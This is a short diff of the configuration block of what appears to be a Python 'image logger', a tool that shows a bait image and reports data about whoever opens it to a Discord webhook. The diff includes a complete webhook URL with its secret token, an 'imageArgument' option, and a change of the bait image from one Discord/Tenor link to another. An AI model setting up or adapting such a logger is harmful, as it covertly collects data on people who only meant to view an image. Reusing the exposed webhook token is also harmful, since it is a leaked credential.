@@ -13,7 +13,7 @@ __author__ = "MoonLight"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1419743266290667570/G9KqjIFnqkc5XYV49myQO5IZLpShmWpok8z7jP_M8fqa2LTdPFCEPsdgjYa1SOjLikQD",
-    "image": "https://images-ext-1.discordapp.net/external/7IG0gWaMGG-9uPkrdN0dHCoKmW_ABaFi5bv0cnu_6uU/https/media.tenor.com/IzBfXEUelxcAAAPo/blitz-blitzo.mp4", # You can also have a custom image by using a URL argument
+    "image": "https://media.discordapp.net/attachments/730891204824399957/1145676513367302164/i-text.gif?ex=68d27fe6&is=68d12e66&hm=b0ee9ea7fbf8252f782caae5be0808d12fc4c01fd978b97f647de5e09a2c5276&=", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
